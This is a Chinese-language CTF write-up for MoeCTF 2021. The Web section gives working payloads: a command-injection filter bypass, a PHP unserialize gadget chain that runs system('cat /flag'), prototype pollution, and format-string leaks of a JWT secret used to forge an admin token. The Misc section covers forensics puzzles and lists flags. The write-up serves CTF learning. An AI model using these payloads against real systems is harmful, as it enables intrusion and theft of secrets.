# MoeCTF 2021

## Web

### Web安全入门指北—小饼干

<figure><img src=".gitbook/assets/Web安全入门指北—小饼干.png" alt="" width="375"><figcaption></figcaption></figure>

改下 Cookie 就可以得到 flag。

### Web安全入门指北—GET

```php
<?php
include "flag.php";
$moe = $_GET['moe'];
if ($moe == "flag") {
    echo $flag;
}else {
    highlight_file(__FILE__);
}
```

Payload 如下

```
moe=flag
```

### 2048

打开网站源代码 - 搜索 flag - 找到 `getFlag` 函数。

```js
getFlag: function() {
	var req = new XMLHttpRequest;
	req.open("GET","flag.php?score="+obj.score,true);
	req.onload = function() {
		alert(this.responseText);
	}
	req.send();
}
```

访问 `/flag.php?score=100000` 即可得到 flag。

### babyRCE

```php
<?php

$rce = $_GET['rce'];
if (isset($rce)) {
    if (!preg_match("/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\>|\<|\'|\"/i", $rce)) {
        system($rce);
    }else {
        echo "hhhhhhacker!!!"."\n";
    }
} else {
    highlight_file(__FILE__);
}
```

构造 Payload 如下

```
rce=ls
```

可以发现该目录下有 `flag.php` 和 `index.php` 两个文件。

构造 Payload 如下

```
rce=c\at${IFS}f\lag.php
```

就可以得到 flag 了。

### unserialize

> https://www.php.cn/faq/485663.html

#### PHP 魔术函数

* \_\_constract：在实例化一个类时，触发
* \_\_destruct：在一个实例对象被销毁的时候触发
* \_\_call(name, arguments)：访问一个不能访问的成员方法时触发
* \_\_get()：读取不可访问属性的值时触发。

#### 解题

**链子**

1. entrance(\_\_construct)
2. entrance(\_\_destruct)
3. springboard(\_\_call)
4. evil(\_\_get)

**构造序列化**

```php
<?php

class entrance
{
    public $start;

    function __construct($start)
    {
        $this->start = $start;
    }

    function __destruct()
    {
        $this->start->helloworld();
    }
}

class springboard
{
    public $middle;

    function __call($name, $arguments)
    {
        echo $this->middle->hs;
    }
}

class evil
{
    public $end;

    function __construct($end)
    {
        $this->end = $end;
    }

    function __get($Attribute)
    {
        eval($this->end);
    }
}

$a = new entrance(new springboard);
$a->start->middle = new evil("system('cat /flag');");
echo serialize($a);
// O:8:"entrance":1:{s:5:"start";O:11:"springboard":1:{s:6:"middle";O:4:"evil":1:{s:3:"end";s:20:"system('cat /flag');";}}}
```

**Payload**

```
serialize=O:8:"entrance":1:{s:5:"start";O:11:"springboard":1:{s:6:"middle";O:4:"evil":1:{s:3:"end";s:20:"system(%27cat%20/flag%27);";}}}
```

### Do you know HTTP

```http
HS / HTTP/1.1
Host: node2.anna.nssctf.cn:28230
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=8767bc72b80045a3c28e8f60acb97340
Connection: close
X-Forwarded-For: 127.0.0.1
Referer: www.ltyyds.com
```

### fake game

查看源代码可以看到 js 代码如下

```js
$(function () {
    $("#submit").on('click', function () {
        $.ajax({
            type: "POST",
            url: "/api/fight",
            contentType: "application/json; charset=utf-8",
            dataType: 'json',
            data: JSON.stringify({
                attributes: {
                    health: parseInt($("#health").val()),
                    attack: parseInt($("#attack").val()),
                    armor: parseInt($("#armor").val()),
                }
            }),
            success: function (res) {
                if (res.status === 200) {
                    alert(res.result);
                } else if(res.status === 403){
                    alert("Invalid input, please try again");
                } else if(res.status === 500){
                    alert("Json data only!");
                }
            },
        })
    })
});
```

本题通过修改 `__proto__` 来修改值就能解力。

通过 `POST` 访问 `/api/fight` ，Payload 如下

```json
{
    "attributes": {
        "health": 0,
        "attack": 0,
        "armor": 0,
        "__proto__": {
            "health": 1000000,
            "attack": 1000000,
            "armor": 1000000
        }
    }
}
```

访问后就可以得到 flag 了。

### 地狱通讯

```python
from flask import Flask, render_template, request
from flag import flag, FLAG
import datetime

app = Flask(__name__)


@app.route("/", methods=['GET', 'POST'])
def index():
    f = open("app.py", "r")
    ctx = f.read()
    f.close()
    f1ag = request.args.get('f1ag') or ""
    exp = request.args.get('exp') or ""
    flAg = FLAG(f1ag)
    message = "Your flag is {0}" + exp
    if exp == "":
        return ctx
    else:
        return message.format(flAg)


if __name__ == "__main__":
    app.run()
```

根据以下 Python 代码

```python
exp = '{0.__class__} {1.__class__}'
message = "{0} {1}" + exp
str1 = 'string'
str2 = 123
print(message)
print(message.format(str1, str2))
# {0} {1}{0.__class__} {1.__class__}
# string 123<class 'str'> <class 'int'>
```

再通过题目中给的 `message.format(flAg)` ，因此该题考的就是 format 格式化字符串。通过构造 Payload 如下

```
exp={0.__class__}
```

得到回显 `Your flag is <class 'flag.FLAG'>` ，说明 FLAG 是个类，再通过 `FLAG(f1ag)` 可以推断出存在构造函数，因此通过构造 Payload 如下

```
exp={0.__class__.__init__.__globals__}
```

就可以读取到 flag 力！

### 地狱通讯-改

拿到题目后先对代码进行格式化（

```python
from flask import Flask, render_template, request, session, redirect, make_response
from secret import secret, headers, User
import datetime
import jwt

app = Flask(__name__)


@app.route("/", methods=['GET', 'POST'])
def index():
    f = open("app.py", "r")
    ctx = f.read()
    f.close()
    res = make_response(ctx)
    name = request.args.get('name') or ''
    if 'admin' in name or name == '':
        return res
    payload = {"name": name, }
    token = jwt.encode(payload, secret, algorithm='HS256', headers=headers)
    res.set_cookie('token', token)
    return res


@app.route('/hello', methods=['GET', 'POST'])
def hello():
    token = request.cookies.get('token')
    if not token:
        return redirect('/', 302)
    try:
        name = jwt.decode(token, secret, algorithms=['HS256'])['name']
    except jwt.exceptions.InvalidSignatureError as e:
        return "Invalid token"
    if name != "admin":
        user = User(name)
        flag = request.args.get('flag') or ''
        message = "Hello {0}, your flag is" + flag
        return message.format(user)
    else:
        return render_template('flag.html', name=name)


if __name__ == "__main__":
    app.run()
```

该题需要得到 `jwt` 为 `admin` 来获取 flag，在生成 `jwt` 的前提是获取 `secret` 和 `headers` ，先随便传入一个 name 来获取 `jwt` ，Payload 如下

```
name=K1sARa
```

可以得到 token 如下

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
```

在 `/hello` 中可以通过跟上题一样的 Python 格式化字符串来获取 `secret` 和 `headers` 的值，构造的 Payload 如下

```
flag={0.__class__.__init__.__globals__}
```

通过回显可以得到 `secret` 的值为 `u_have_kn0w_what_f0rmat_i5` ， `headers` 的值为 `{'alg': 'HS256', 'typ': 'JWT'}` 。

通过以下代码

```python
import jwt

print(jwt.encode({
    'name': 'admin'
}, 'u_have_kn0w_what_f0rmat_i5', algorithm='HS256', headers= {
    'alg': 'HS256',
    'typ': 'JWT'
}))
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4ifQ.jlAcmWWxtmNLxbxwfRE45Fxf16dX6LQmrK_1dgx7zmg
```

可以得到用户名为 `admin` 的 token，通过这个 token 作为 Cookie 再去访问 `/hello` 就可以得到 flag 力！

## Misc

### misc入门指北

flag 在 markdown 文件末尾 `moectf{Th1s-1s-Misc}` ！指北好耶！

### find\_me

根据题目描述用 010 Editor 打开拉到最底下就可以发现 flag `moectf{hs_g1v3_u_fl@g}`

### Homework

使用压缩包打开附件，用 VSCode 或其他打开 `/word/document.xml` 文件，通过正则表达式 `<(.*?)>` 来删除所有的标签仅留下文本，如下

```
随着新冠肺炎疫情防控工作的持续开展，国家开始加快重大项目和新的基础设施建设，特别是计划建设一大批数字化基础设施，以进一步实现我国各行业的数字化、网络化和智能化改造，并为中国经济发展再添一把火。同时，今年中央政法工作会议强调防控新型网络安全风险，加强网络社会综合管理能力，flag{0h_U_不断完善网络社会整体防控体系。特别是作为国民经济建设中心的新型基础设施，在发展过程中必须强调网络安全。相关新兴技术领域的安全风险发展迅速，技术、应用和产业供应链的安全风险将变得越来越重要。由于虚拟空间的开放，网络安全问题严重威胁着人身和财产的安全，数据、系统和服务脱离了封闭的内部环境，面对数据泄露和恶意攻击的风险，管理和控制功能被弱化。新的基础设施在注重"促进创新 "的同时，包括5G、大数据、人工智能、云计算、物联网、区块链等多项新技术在内的应用和迭代将带来风险。数字化基础设施的数字化转型和物联网的普及，将带动众多新兴企业的发展，并将对人们的办公、居家和移动生活产生深刻影响。互联网的产业安全、城市的智能安全、交通的智能安全、家庭的智能安全也将影响整个数字经济，影响政府、企业和个人。随着国民经济活动向虚拟空间的扩展，数字经济的基础设施也将成为重要的博弈平台，从网络安全攻击者到商业竞争者，经济利益的流动是单个公司和组织无法处理的，等等。这将在网络空间产生激烈的冲突，需要维护数字基础设施的公司、数字企业和安全机构/安全机构的融合。企业和国家监管部门的多方位应对。网络犯罪已成为阻碍国家经济生活稳定的犯罪 "新温床"。承载各种数字产业的新型基础设施，汇集了消费、商业、金融等高价值经济要素，也成为网络犯罪的主要目标。鉴于未来网络安全挑战的复杂性和动态性，为确保数字经济的可持续发展，必须建立全面的网络安全保护体系。克服和改善这些安全挑战，将为全球数字经济的发展创造宝贵的经验。8001000664845f1nd_m3!}020000f1nd_m3!}在机遇方面，中国更加强调网络是人类生产和生活的新空间，这也将为经济发展提供强大的动力。挑战则包括：国际网络威慑战略的强化，以及网络空间军备竞赛对世界和平的威胁加剧。中国的战略目标是建设网络强国，总体认识是 "坚决维护网络安全，最大限度挖掘网络空间发展潜力，更好地造福13亿多中国人，造福全人类，坚决维护世界和平"，国家安全。
```

flag 就在上述文本当中，即 `flag{0h_U_f1nd_m3!}` 。

### 诺亚的日记

将下载下来的文件丢到 kali 用 Wireshark 打开，可以看到基本都是 HID Data ，那就将 HID Data 的数据提取出来。

```bash
$ tshark -r usb.pcapng -T fields -e usbhid.data  > usbdata.txt
```

读取后通过引用中的脚本进行解码就可以得到 flag `moectf{D@m3daNe_D4me_yoooooo}` ，完整代码如下

```python
import re

normalKeys = {"04": "a", "05": "b", "06": "c", "07": "d", "08": "e", "09": "f", "0a": "g", "0b": "h", "0c": "i",
              "0d": "j", "0e": "k", "0f": "l", "10": "m", "11": "n", "12": "o", "13": "p", "14": "q", "15": "r",
              "16": "s", "17": "t", "18": "u", "19": "v", "1a": "w", "1b": "x", "1c": "y", "1d": "z", "1e": "1",
              "1f": "2", "20": "3", "21": "4", "22": "5", "23": "6", "24": "7", "25": "8", "26": "9", "27": "0",
              "28": "<RET>", "29": "<ESC>", "2a": "<DEL>", "2b": "\t", "2c": "<SPACE>", "2d": "-", "2e": "=", "2f": "[",
              "30": "]", "31": "\\", "32": "<NON>", "33": ";", "34": "'", "35": "<GA>", "36": ",", "37": ".", "38": "/",
              "39": "<CAP>", "3a": "<F1>", "3b": "<F2>", "3c": "<F3>", "3d": "<F4>", "3e": "<F5>", "3f": "<F6>",
              "40": "<F7>", "41": "<F8>", "42": "<F9>", "43": "<F10>", "44": "<F11>", "45": "<F12>"}
shiftKeys = {"04": "A", "05": "B", "06": "C", "07": "D", "08": "E", "09": "F", "0a": "G", "0b": "H", "0c": "I",
             "0d": "J", "0e": "K", "0f": "L", "10": "M", "11": "N", "12": "O", "13": "P", "14": "Q", "15": "R",
             "16": "S", "17": "T", "18": "U", "19": "V", "1a": "W", "1b": "X", "1c": "Y", "1d": "Z", "1e": "!",
             "1f": "@", "20": "#", "21": "$", "22": "%", "23": "^", "24": "&", "25": "*", "26": "(", "27": ")",
             "28": "<RET>", "29": "<ESC>", "2a": "<DEL>", "2b": "\t", "2c": "<SPACE>", "2d": "_", "2e": "+", "2f": "{",
             "30": "}", "31": "|", "32": "<NON>", "33": "\"", "34": ":", "35": "<GA>", "36": "<", "37": ">", "38": "?",
             "39": "<CAP>", "3a": "<F1>", "3b": "<F2>", "3c": "<F3>", "3d": "<F4>", "3e": "<F5>", "3f": "<F6>",
             "40": "<F7>", "41": "<F8>", "42": "<F9>", "43": "<F10>", "44": "<F11>", "45": "<F12>"}
output = []

txt = open('usbdata.txt', 'r')

for line in txt:
    line = line.strip('\n')
    if len(line) == 16:
        line_list = re.findall('.{2}', line)
        line = ":".join(line_list)
        try:
            if line[0] != '0' or (line[1] != '0' and line[1] != '2') or line[3] != '0' or line[4] != '0' or line[
                9] != '0' or line[10] != '0' or line[12] != '0' or line[13] != '0' or line[15] != '0' or line[
                16] != '0' or line[18] != '0' or line[19] != '0' or line[21] != '0' or line[22] != '0' or line[
                                                                                                          6:8] == "00":
                continue
            if line[6:8] in normalKeys.keys():
                output += [[normalKeys[line[6:8]]], [shiftKeys[line[6:8]]]][line[1] == '2']
            else:
                output += ['[unknown]']
        except:
            pass

txt.close()

flag = 0
print("".join(output))
for i in range(len(output)):
    try:
        a = output.index('<DEL>')
        del output[a]
        del output[a - 1]
    except:
        pass
for i in range(len(output)):
    try:
        if output[i] == "<CAP>":
            flag += 1
            output.pop(i)
            if flag == 2:
                flag = 0
        if flag != 0:
            output[i] = output[i].upper()
    except:
        pass
print('output :' + "".join(output))
# 2021nian<SPACE>8yue<SPACE>5ri<SPACE>,qing22<DEL><RET>zuotian<SPACE>gei<SPACE>hanshu<SPACE>fale<SPACE>caotu<SPACE>,cadai<DEL><DEL><DEL><DEL><DEL>odaooo<DEL><DEL>41tale<SPACE>,kaixin<SPACE><RET>yizhou<SPACE>meiyoukan<SPACE>jiaran=61de<SPACE>shipinle<SPACE>,nanshou<SPACE>nie1<RET>dongfangyaohe<SPACE>musedash<RET>liandongle<SPACE>,shuangchukuangxi<SPACE>[unknown][unknown]<DEL>chu=2[unknown][unknown]<RET>moectf<RET>de<SPACE>misc<RET>ti<SPACE>caichule<SPACE>4dao2,male<SPACE><RET>woxiang<SPACE>moyu2moyu<SPACE>mou<DEL>yu<SPACE><RET>d<DEL><GA>damedane	<RET>\<DEL>,<RET>dameyo<SPACE><RET>,<RET>damenanoyo<SPACE><RET><RET>xin2misc<RET>ti<SPACE>de<SPACE>flag<RET>xiangge3shengcao21yidiande<SPACE><RET>jiujiao<DEL><DEL><DEL><DEL>yo<DEL>ng<SPACE><SPACE>moectf<RET>{}[unknown]D@m3daNe_D4me_yoooooo[unknown][unknown][unknown]haole<DEL><DEL><DEL><DEL><DEL><SPACE>haole<SPACE>riji<SPACE>.<DEL>.txt<RET>
# output :2021nian<SPACE>8yue<SPACE>5ri<SPACE>,qing2<RET>zuotian<SPACE>gei<SPACE>hanshu<SPACE>fale<SPACE>caotu<SPACE>,odao41tale<SPACE>,kaixin<SPACE><RET>yizhou<SPACE>meiyoukan<SPACE>jiaran=61de<SPACE>shipinle<SPACE>,nanshou<SPACE>nie1<RET>dongfangyaohe<SPACE>musedash<RET>liandongle<SPACE>,shuangchukuangxi<SPACE>[unknown]chu=2[unknown][unknown]<RET>moectf<RET>de<SPACE>misc<RET>ti<SPACE>caichule<SPACE>4dao2,male<SPACE><RET>woxiang<SPACE>moyu2moyu<SPACE>moyu<SPACE><RET><GA>damedane	<RET>,<RET>dameyo<SPACE><RET>,<RET>damenanoyo<SPACE><RET><RET>xin2misc<RET>ti<SPACE>de<SPACE>flag<RET>xiangge3shengcao21yidiande<SPACE><RET>jiuyng<SPACE><SPACE>moectf<RET>{}[unknown]D@m3daNe_D4me_yoooooo[unknown][unknown][unknown]<SPACE>haole<SPACE>riji<SPACE>.txt<RET>
```
